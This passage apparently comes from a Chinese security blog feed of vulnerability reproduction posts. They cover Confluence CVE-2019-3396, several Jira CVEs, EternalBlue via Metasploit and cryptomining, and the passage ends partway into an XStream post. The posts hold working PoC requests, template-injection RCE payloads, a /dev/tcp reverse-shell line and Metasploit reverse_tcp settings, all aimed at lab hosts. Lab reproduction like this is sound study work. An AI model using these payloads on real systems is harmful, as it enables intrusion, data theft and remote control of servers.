        <content type="html"><![CDATA[<h4 id="漏洞说明："><a href="#漏洞说明：" class="headerlink" title="漏洞说明："></a>漏洞说明：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，并且可以利用Velocity模板注入执行任意命令。</span><br><span class="line">漏洞影响版本：</span><br><span class="line">Confluence 1.*.*、2.*.*、3.*.*、4.*.*、5.*.*</span><br><span class="line">Confluence 6.0.*、6.1.*、6.2.*、6.3.*、6.4.*、6.5.*</span><br><span class="line">Confluence 6.6.* &lt; 6.6.12</span><br><span class="line">Confluence6.7.*、6.8.*、6.9.*、6.10.*、6.11.*</span><br><span class="line">Confluence 6.12.* &lt; 6.12.3</span><br><span class="line">Confluence 6.13.* &lt; 6.13.3</span><br><span class="line">Confluence 6.14.* &lt; 6.14.2</span><br><span class="line">漏洞成因：</span><br><span class="line">_template参数覆盖Velocity渲染模板, 利用file:协议可以进行任意文件读取(不再受限于classpath)</span><br></pre></td></tr></table></figure><h4 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h4><p>Vulhub+Centos7.2</p><h4 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h4><p>参考<a href="https://vulhub.org/#/environments/confluence/CVE-2019-3396/" target="_blank" rel="noopener">vulhub</a>搭建好环境</p><p><img src="/imgs/image-20201123153420871.png" alt="image-20201123153420871"></p><h5 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a>路径穿越</h5><p>复现POC</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/rest/tinymce/1/macro/preview</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.116.132:8090</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.116.132:8090</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 169</span><br><span class="line"></span><br><span class="line">&#123;"contentId":"786458","macro":&#123;"name":"widget","body":"","params":&#123;"url":"https://www.viddler.com/v/23464dc6t","width":"1000","height":"1000","_template":"../web.xml"&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>复现截图：</p><p><img src="/imgs/image-20201123173702062.png" alt="image-20201123173702062"></p><p>读取passwd文件</p><p><img src="/imgs/image-20201123182204113.png" alt="image-20201123182204113"></p><p>也可以进行SSRF探测</p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>远程命令执行POC就是把模板换成远程RCE VM文件</p><blockquote><p>VM后缀的文件是基于java的velocity模板引擎的一种页面控制文件，你可以用文本编译器打开，能够看到他只是一些类似html的语句和一种叫VLT的语句构成的。</p></blockquote><p>下载<a href="https://github.com/Yt1g3r/CVE-2019-3396_EXP/blob/master/cmd.vm" target="_blank" rel="noopener">VM</a>到本地，搭建ftp环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line">python -m pyftpdlib -p 21</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201123184708168.png" alt="image-20201123184708168"></p><p>复现POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;rest&#x2F;tinymce&#x2F;1&#x2F;macro&#x2F;preview HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.116.132:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.116.132:8090</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 202</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;786458&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https:&#x2F;&#x2F;www.viddler.com&#x2F;v&#x2F;23464dc6t&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;ftp:&#x2F;&#x2F;192.168.116.132&#x2F;cmd.vm&quot;,&quot;cmd&quot;:&quot;whoami&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201123184908648.png" alt="image-20201123184908648"></p>]]></content>
      
      
      <categories>
          
          <category> Confluence </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Confluence </tag>
            
            <tag> CVE-2019-3396 </tag>
            
            <tag> 路径穿越 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Atlassian Jira 系列漏洞复现</title>
      <link href="2020/11/23/Atlassian-Jira-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/11/23/Atlassian-Jira-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="CVE-2020-14181用户枚举信息泄露"><a href="#CVE-2020-14181用户枚举信息泄露" class="headerlink" title="CVE-2020-14181用户枚举信息泄露"></a>CVE-2020-14181用户枚举信息泄露</h3><p>jira /secure/ViewUserHover.jspa?username=user 接口存在用户信息泄露漏洞，可以查看用户名和邮箱账号</p><p>Jira &lt; 7.13.6; 8.0.0 ≤ Jira &lt; 8.5.7; 8.6.0 ≤ Jira &lt; 8.12.0</p><p><img src="/imgs/image-20201225161015832.png" alt="image-20201225161015832"></p><p><img src="/imgs/image-20201225161034762.png" alt="image-20201225161034762"></p><h3 id="CVE-2019-11581-远程代码执行"><a href="#CVE-2019-11581-远程代码执行" class="headerlink" title="CVE-2019-11581 远程代码执行"></a>CVE-2019-11581 远程代码执行</h3><h4 id="漏洞说明："><a href="#漏洞说明：" class="headerlink" title="漏洞说明："></a>漏洞说明：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">此漏洞由于Atlassian Jira中的Atlassian Jira Server和Jira Data Center模块存在模板注入，当”联系管理员表单“功能开启时，攻击者可以在表单插入java恶意代码,当服务端对传入数据进行解析时,会执行数据中插入的恶意代码,并执行其中的命令。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。</span><br><span class="line">影响版本：</span><br><span class="line">Atlassian Jira 4.4.x</span><br><span class="line">Atlassian Jira 5.x.x</span><br><span class="line">Atlassian Jira 6.x.x</span><br><span class="line">Atlassian Jira 7.0.x</span><br><span class="line">Atlassian Jira 7.1.x</span><br><span class="line">Atlassian Jira 7.2.x</span><br><span class="line">Atlassian Jira 7.3.x</span><br><span class="line">Atlassian Jira 7.4.x</span><br><span class="line">Atlassian Jira 7.5.x</span><br><span class="line">Atlassian Jira 7.6.x &lt; 7.6.14</span><br><span class="line">Atlassian Jira 7.7.x</span><br><span class="line">Atlassian Jira 7.8.x</span><br><span class="line">Atlassian Jira 7.9.x</span><br><span class="line">Atlassian Jira 7.10.x</span><br><span class="line">Atlassian Jira 7.11.x</span><br><span class="line">Atlassian Jira 7.12.x</span><br><span class="line">Atlassian Jira 7.13.x &lt; 7.13.5</span><br><span class="line">Atlassian Jira 8.0.x &lt; 8.0.3</span><br><span class="line">Atlassian Jira 8.1.x &lt; 8.1.2</span><br><span class="line">Atlassian Jira 8.2.x &lt; 8.2.3</span><br></pre></td></tr></table></figure><h4 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p>Vulhub+centos7.2</p><p>根据<a href="https://vulhub.org/#/environments/jira/CVE-2019-11581/" target="_blank" rel="noopener">vulhub</a>搭建环境</p><h4 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h4><p>无需管理员用户可直接利用</p><p>POC：</p><p>/secure/admin/AddSmtpMailServer!default.jspa</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$i18n.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;, null).invoke(null, null).exec(&#39;touch &#x2F;tmp&#x2F;111se&#39;).toString()</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201123211648780.png" alt="image-20201123211648780"></p><p>成功创建文件</p><p><img src="/imgs/image-20201123215837875.png" alt="image-20201123215837875"></p><p>尝试反弹shell，但失败了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i18n</span>.getClass().forName(<span class="string">'java.lang.Runtime'</span>).getMethod(<span class="string">'getRuntime'</span>, null).invoke(null, null).<span class="built_in">exec</span>(<span class="string">'/bin/bash -i &gt;&amp; /dev/tcp/192.168.116.132/9999 0&gt;&amp;1'</span>).toString()</span><br></pre></td></tr></table></figure><h3 id="CVE-2019-8451-SSRF"><a href="#CVE-2019-8451-SSRF" class="headerlink" title="CVE-2019-8451 SSRF"></a>CVE-2019-8451 SSRF</h3><h4 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h4><blockquote><p>jira的/plugins/servlet/gadgets/makeRequest资源存在SSRF漏洞，原因在于JiraWhitelist这个类的逻辑缺陷，成功利用此漏洞的远程攻击者可以以Jira服务端的身份访问内网资源。经分析，此漏洞无需任何凭据即可触发。</p><p>Jira &lt; 8.4.0</p></blockquote><h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>参考<a href="https://zhuanlan.zhihu.com/p/113333332搭建" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/113333332搭建</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull cptactionhank/atlassian-jira:7.8.0</span><br><span class="line">docker run --detach --publish 8080:8080 cptactionhank/atlassian-jira:7.8.0</span><br></pre></td></tr></table></figure><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>说明：无需授权可以直接利用</p><p>POC：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/plugins/servlet/gadgets/makeRequest?url=http://192.168.116.132:8080@111.******.ceye.io</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.116.132:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: NX-ANTI-CSRF-TOKEN=0.03749628905546676; atlassian.xsrf.token=BYDI-PMUA-OOQ7-LTI1|251feae08a87b5038d7dc194ee3145da98d79a31|lout; JSESSIONID=6E73FD65DBF3E9D177CE85F89428CF38</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">X-Atlassian-Token</span>: no-check</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">200</span> </span><br><span class="line"><span class="attribute">X-AREQUESTID</span>: 781x319x1</span><br><span class="line"><span class="attribute">X-XSS-Protection</span>: 1; mode=block</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span>: nosniff</span><br><span class="line"><span class="attribute">X-Frame-Options</span>: SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Security-Policy</span>: frame-ancestors 'self'</span><br><span class="line"><span class="attribute">X-ASEN</span>: SEN-L16490966</span><br><span class="line"><span class="attribute">X-AUSERNAME</span>: anonymous</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 17 Dec 2020 14:01:10 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: public,max-age=3600</span><br><span class="line"><span class="attribute">Content-Disposition</span>: attachment;filename=p.txt</span><br><span class="line"><span class="attribute">Vary</span>: User-Agent</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 111</span><br><span class="line"><span class="attribute">Date</span>: Thu, 17 Dec 2020 13:01:11 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">throw 1; &lt; don't be evil' &gt;&#123;"http://192.168.116.132:8080@111.******.ceye.io":&#123;"rc":500,"headers":&#123;&#125;,"body":""&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201218134859315.png" alt="image-20201218134859315"></p><p><img src="/imgs/image-20201217212117590.png" alt="image-20201217212117590"></p><h3 id="CVE-2019-8449-用户名枚举"><a href="#CVE-2019-8449-用户名枚举" class="headerlink" title="CVE-2019-8449 用户名枚举"></a>CVE-2019-8449 用户名枚举</h3><h4 id="漏洞说明-1"><a href="#漏洞说明-1" class="headerlink" title="漏洞说明"></a>漏洞说明</h4><blockquote><p>Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。 Atlassian Jira 8.4.0之前版本中的/rest/api/latest/groupuserpicker资源存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。</p><p>Atlassian Jira 7.12&lt; 受影响版本&lt;8.4.0</p></blockquote><h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p>POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;rest&#x2F;api&#x2F;latest&#x2F;groupuserpicker?query&#x3D;用户名&amp;maxResults&#x3D;50&amp;showAvatar&#x3D;false</span><br></pre></td></tr></table></figure><p>tttt用户名不存在 响应</p><p><img src="/imgs/image-20201218134512158.png" alt="image-20201218134512158"></p><p>admin用户名存在 响应</p><p><img src="/imgs/image-20201218134606522.png" alt="image-20201218134606522"></p>]]></content>
      
      
      <categories>
          
          <category> Atlassian Jira </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jira </tag>
            
            <tag> CVE-2020-14181 </tag>
            
            <tag> CVE-2019-11581 </tag>
            
            <tag> CVE-2019-8451 </tag>
            
            <tag> CVE-2019-8449 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝MS17-010漏洞复现</title>
      <link href="2020/11/18/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/11/18/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>作为内网横向渗透/HW刷分漏洞，还是值得看下。</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>victim：windows 2008 r2  - 192.168.116.148</p><p>attack：kali2020 - 192.168.116.11</p><h4 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h4><p>先用nmap扫描目标是否开启smb服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  nmap -T4 -sS -Pn -sV -p445 192.168.116.148</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201118201450681.png" alt="image-20201118201450681"></p><p>确认开启了445端口，可以尝试进行下一步</p><p>先在msf查找永恒之蓝相关的模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201118201758536.png" alt="image-20201118201758536"></p><p>发现扫描可用模块：auxiliary/scanner/smb/smb_ms17_010，漏洞利用：exploit/windows/smb/ms17_010_eternalblue</p><p>先扫描是否存在漏洞，设置目标信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.116.148</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201118202211667.png" alt="image-20201118202211667"></p><p>发现可能存在漏洞，进一步尝试攻击。选择ms17_010_eternalblue模块，设置payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.116.148</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.116.11</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201118203321080.png" alt="image-20201118203321080"></p><p><img src="/imgs/image-20201118203447261.png" alt="image-20201118203447261"></p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 永恒之蓝 </tag>
            
            <tag> MS17-010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于挖矿的那些事</title>
      <link href="2020/11/18/%E5%85%B3%E4%BA%8E%E6%8C%96%E7%9F%BF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
      <url>2020/11/18/%E5%85%B3%E4%BA%8E%E6%8C%96%E7%9F%BF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<p>分析APT异常事件的时候见到很多次，但是有些内容不清楚，今天先来学习下。</p><p>围绕以下五个方面：</p><ol><li>挖矿到底是什么？</li><li>挖矿为什么会带来价值？</li><li>挖矿挖的哪些币？有什么区别？</li><li>怎么挖矿？</li><li>挖矿跟网络安全/黑产有什么关系？</li></ol><h4 id="挖矿的理解"><a href="#挖矿的理解" class="headerlink" title="挖矿的理解"></a>挖矿的理解</h4><p>挖矿简单说其实就是求解数学题，但是这个数学题的求解不是靠技巧，而就是直接使用<strong>暴力破解</strong>。举个例子：</p><p>（1）假设我现在在微博超级话题#区块链#的某篇文章中放了一个价值两千块钱的福利，并且通过随机数选取的方式给它赋予了一个数字；【比特币挖矿奖励】</p><p>（2）关注#区块链#超级话题并评论正确数字的第一个人将得到这个福利；【挖矿，随机数填充数字求解】</p><p>–自己一个猜【个人挖矿】</p><p>–出成本召集人一起来猜【矿场】</p><p>–召集一群人一起来猜，通过每人猜的次数（工作量证明），期间如果有人猜中，按每人猜的次数（算力）平分福利【矿池】</p><p>其实（比特币）挖矿的发展也很有意思，和当年的淘金挖矿如出一辙。当年淘金刚开始时单个的淘金者在盘中盛上矿石，灌点溪水使劲颠，闪亮的金粒就会显现于盘底。<strong>而比特币挖矿刚开始时</strong>，个人随便用台旧电脑跑个程序就能得到比特币，当时使用的是CPU;<strong>在淘金的第二个阶段</strong>，加快处理矿石的淘金溜槽开始出现。比特币挖矿的第二个阶段则开始出现了GPU挖矿的黄金时期；<em>淘金的第三个阶段</em>，人们开始使用高压水枪冲击含金砾石，形成沙浆，准备进一步筛分矿物。比特币挖矿的<strong>第三个阶段</strong>则开始出现可编程门阵列FPGA；<strong>淘金的第四个阶段</strong>，个人已经完全没有竞争力了，出现了各种大型的矿场和先进的机器。而在这个阶段，由于首款专用于比特币挖矿的集成电路ASIC的出现，比特币挖矿也变成了一个需要大量资金投入的大型工程。</p><h4 id="挖矿为什么会带来价值？"><a href="#挖矿为什么会带来价值？" class="headerlink" title="挖矿为什么会带来价值？"></a>挖矿为什么会带来价值？</h4><p>跟纸币的价值理解类似</p><blockquote><p>如果我们能理解纸币为什么能成为货币，能购买东西并拥有价值，那么我们也很容易理解为什么比特币有价值。货币其实只是充当了交换媒介，无论是早期的牛羊、斧头，还是后来的金属币、纸币，大家都认可它可以作为一般等价物进行交换，那么它就可以承担货币的智能。说白了，货币就是一个充当价值的符号，纸可以成为货币，那么代码为什么不能呢？从这个角度讲比特币作为一种广义的货币，被人们赋予了一定的价值。 那你可能会问：代码可以成为货币，那为什么是比特币而不是Q币呢？比特币是中本聪于2008年创造出来的一种点对点的电子现金系统，是第一次完成了去中心化货币概念的验证。基于区块链技术的比特币是完全开源的，任何人在任何地方都可以参与到比特币网络，实现点对点的价值传递。而Q币是腾讯公司发布的，用于购买腾讯公司虚拟商品或服务的代币，应用范围仅限于腾讯公司内部。从使用范围和价值传递模式上来讲，比特币更为先进和普适。</p></blockquote><img src="/imgs/image-20201127203713356.png" alt="image-20201127203713356" style="zoom:50%;" /><h4 id="挖矿币种和区别？"><a href="#挖矿币种和区别？" class="headerlink" title="挖矿币种和区别？"></a>挖矿币种和区别？</h4><p>来看下网络上给出的<a href="https://www.528btc.com/zhuanti/533552.html" target="_blank" rel="noopener">十大币种</a>，就那我经常看到的名词来说吧，比特币和以太坊是最值钱的，门罗币相对来说价格较低，所以不同的币种价值不同。</p><p><img src="/imgs/image-20201127160926982.png" alt="image-20201127160926982"></p><h4 id="怎么挖矿？"><a href="#怎么挖矿？" class="headerlink" title="怎么挖矿？"></a>怎么挖矿？</h4><p>以门罗币挖矿为例，具体教程参考：<a href="https://blog.csdn.net/wab719591157/article/details/82717458" target="_blank" rel="noopener">https://blog.csdn.net/wab719591157/article/details/82717458</a></p><h4 id="挖矿跟网络安全-黑产有什么关系？"><a href="#挖矿跟网络安全-黑产有什么关系？" class="headerlink" title="挖矿跟网络安全/黑产有什么关系？"></a>挖矿跟网络安全/黑产有什么关系？</h4><p>黑客需要虚拟货币来进行交易；另外就是利益所趋，拿下大量的服务器来进行挖矿</p><blockquote><p>虚拟货币自诞生以来，就与黑产有着说不清道不明的关系，从一开始充当地下交易的介质，到成为逃避追踪的勒索病毒的钱包，利益之所向，必是黑产之跟随。</p><p>随着虚拟货币在市场中的价格节节攀升，越来越多的黑产也不满足于使用虚拟货币，转而投身于挖矿的大军中去。</p><p>当然，黑产们本身并不具备生产虚拟货币的必要条件，所以他们动起了肉鸡挖矿的心思，虽然服务器质量层次不齐，但聚沙成塔，积少成多，矿池的出现更是大大方便了黑产们挖矿的脚步。</p></blockquote><h5 id="黑客如何挖矿"><a href="#黑客如何挖矿" class="headerlink" title="黑客如何挖矿"></a>黑客如何挖矿</h5><img src="/imgs/image-20201127201903489.png" alt="image-20201127201903489" style="zoom:50%;" /><h5 id="服务器中挖矿木马与远程通信的主要特征"><a href="#服务器中挖矿木马与远程通信的主要特征" class="headerlink" title="服务器中挖矿木马与远程通信的主要特征"></a>服务器中挖矿木马与远程通信的主要特征</h5><p>挖矿程序与远程通信的特征主要有两种，一种是矿工登录特征：</p><p><img src="/imgs/image-20201128160608995.png" alt="image-20201128160608995"></p><p>一种是矿工分发任务特征：</p><p><img src="/imgs/image-20201128160646958.png" alt="image-20201128160646958"></p><p>参考链接：</p><p><a href="https://blog.csdn.net/wab719591157/article/details/82717458" target="_blank" rel="noopener">https://blog.csdn.net/wab719591157/article/details/82717458</a></p><p><a href="https://blog.csdn.net/qq_24676097/article/details/101110288" target="_blank" rel="noopener">https://blog.csdn.net/qq_24676097/article/details/101110288</a></p><p><a href="https://www.freebuf.com/vuls/206874.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/206874.html</a></p><p><a href="https://www.freebuf.com/articles/network/186208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/186208.html</a></p><p><a href="https://www.freebuf.com/articles/network/157775.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/157775.html</a></p><p><a href="https://www.freebuf.com/articles/network/194145.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/194145.html</a></p><p><a href="https://mp.weixin.qq.com/s/G4ywp2ZLRTrDMxsOFcaodg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/G4ywp2ZLRTrDMxsOFcaodg</a></p><p><a href="https://moore.live/news/255297/detail/" target="_blank" rel="noopener">https://moore.live/news/255297/detail/</a></p><p><a href="https://www.anquanke.com/post/id/166681" target="_blank" rel="noopener">https://www.anquanke.com/post/id/166681</a></p><p><a href="https://www.freebuf.com/articles/web/242574.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/242574.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 挖矿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挖矿 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XStream CVE-2020-26217 复现</title>
      <link href="2020/11/17/XStream-CVE-2020-26217-%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/11/17/XStream-CVE-2020-26217-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>没有时间分析，先复现下，过几天有空再分析</p><p>复现代码，使用官网给的payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 